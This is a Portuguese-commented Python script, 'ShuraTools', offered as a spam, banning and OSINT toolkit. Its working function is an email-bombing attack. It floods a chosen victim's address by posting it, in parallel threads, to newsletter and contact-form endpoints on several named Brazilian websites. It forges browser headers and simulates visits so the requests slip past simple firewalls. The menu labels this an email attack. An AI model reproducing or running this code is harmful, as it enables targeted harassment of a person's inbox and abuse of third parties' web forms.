#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShuraTools.py – Swiss-army knife para spam, banimento e OSINT.
Versão Pro v3.0 Smart-Headers
"""

import os
import sys
import time
import random
import string
import argparse
import threading
import json
import re
import socket
from queue import Queue

try:
    import requests
    from faker import Faker
    from colorama import Fore, Style, init
    init(autoreset=True)
    fake = Faker()
except ImportError:
    print("[!] Erro: Execute 'pip install requests faker colorama'")
    sys.exit(1)

BANNER = f"""
{Fore.CYAN}  _____ _    _ _    _ _____            
{Fore.CYAN} / ____| |  | | |  | |  __ \     /\    
{Fore.CYAN}| (___ | |__| | |  | | |__) |   /  \   
{Fore.CYAN} \___ \|  __  | |  | |  _  /   / /\ \  
{Fore.CYAN} ____) | |  | | |__| | | \ \  / ____ \ 
{Fore.CYAN}|_____/|_|  |_|\____/|_|  \_\/_/    \_\
                                       
{Fore.YELLOW}  >> SpamMail | OSINT | PortScan | Social <<
{Fore.RED}       v3.0 Smart-Headers - by Shura
"""

LOCK = threading.Lock()
PROXY_QUEUE = Queue()

UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
]

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def log(msg, type="info"):
    colors = {
        "info": Fore.WHITE + "[*] ",
        "success": Fore.GREEN + "[+] ",
        "error": Fore.RED + "[-] ",
        "warn": Fore.YELLOW + "[!] ",
        "osint": Fore.MAGENTA + "[?] "
    }
    prefix = colors.get(type, Fore.WHITE)
    with LOCK:
        print(f"{prefix}{msg}{Style.RESET_ALL}")

# ---------- Endpoints Selecionados (Menos Proteção / Mais Entrega) ----------
def spam_mail(target, qty, threads, use_proxy):
    # Sites que usam formulários simples de newsletter (WordPress/Mailchimp/Simples)
    endpoints = [
        {"url": "https://pactonacional.com.br/wp-admin/admin-ajax.php", "data": {"action": "newsletter_subscribe", "email": target}},
        {"url": "https://www.mundoconectado.com.br/newsletter", "data": {"email": target, "action": "subscribe"}},
        {"url": "https://www.b9.com.br/wp-json/contact-form-7/v1/contact-forms/1/feedback", "data": {"your-email": target}},
        {"url": "https://tecnoblog.net/wp-admin/admin-ajax.php", "data": {"action": "newsletter_signup", "email": target}},
        {"url": "https://www.infomoney.com.br/wp-json/infomoney/v1/newsletter/subscribe", "data": {"email": target}},
        {"url": "https://portaldoacre.com.br/newsletter-subscribe", "data": {"email": target}}
    ]

    def job(start, end):
        session = requests.Session() # Mantém cookies para parecer humano
        for i in range(start, end):
            try:
                site = random.choice(endpoints)
                ua = random.choice(UA_LIST)
                
                # Cabeçalhos avançados para ignorar firewalls simples
                headers = {
                    "User-Agent": ua,
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Referer": site["url"].split("/wp-json")[0] if "wp-json" in site["url"] else site["url"],
                    "X-Requested-With": "XMLHttpRequest"
                }

                # Simula uma visita prévia
                if i % 3 == 0:
                    session.get(headers["Referer"], timeout=5)

                res = session.post(site["url"], data=site["data"], headers=headers, timeout=10)
                
                if res.status_code < 400:
                    log(f"E-mail {i+1} disparado via {site['url'].split('/')[2]}", "success")
                else:
                    log(f"Servidor recusou {i+1} (Status {res.status_code})", "warn")
            
            except Exception:
                log(f"E-mail {i+1} falhou (Conexão)", "error")

    log(f"Iniciando ciclo Smart-Headers para {target}...", "info")
    chunk, rem = qty // threads, qty % threads
    ts = []
    curr = 0
    for i in range(threads):
        take = chunk + (1 if i < rem else 0)
        if take <= 0: continue
        t = threading.Thread(target=job, args=(curr, curr + take))
        t.start()
        ts.append(t)
        curr += take
    for t in ts: t.join()

# ---------- Menu e CLI ----------
def menu():
    while True:
        clear()
        print(BANNER)
        print("[ 1 ] Iniciar Ataque de E-mail (Smart-Headers)")
        print("[ 2 ] OSINT Hunter")
        print("[ 3 ] Port Scanner")
        print("[ 0 ] Sair")
        print("-" * 40)
        
        opt = input(f"{Fore.YELLOW}Opção: {Style.RESET_ALL}").strip()
        if opt == "0": break
        if opt == "1":
            target = input(f"{Fore.YELLOW}E-mail Alvo: {Style.RESET_ALL}").strip()
            if "@" in target:
                spam_mail(target, 30, 5, False) # Teste padrão: 30 emails
                input("\nVerifique a pasta PROMOÇÕES ou SPAM. ENTER para voltar...")
            else:
                log("E-mail inválido!", "error"); time.sleep(1)

if __name__ == "__main__":
    menu()
